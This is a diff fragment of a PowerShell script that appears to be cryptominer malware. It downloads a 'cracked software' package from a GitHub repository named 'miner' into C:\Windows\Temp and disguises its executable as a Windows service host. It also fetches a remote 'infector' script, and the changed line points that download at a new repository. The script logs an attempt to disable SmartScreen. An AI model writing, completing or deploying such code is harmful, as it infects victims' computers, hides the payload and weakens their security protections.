@@ -27,7 +27,7 @@ $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/head
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
 $crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
-$infectorUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/infect.ps1"
+$infectorUrl = "https://github.com/NaomiMendoza127/filetest12345/raw/refs/heads/main/infector.ps1"
 $infectorPath = "C:\Windows\Temp\infect.ps1"
 
 Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
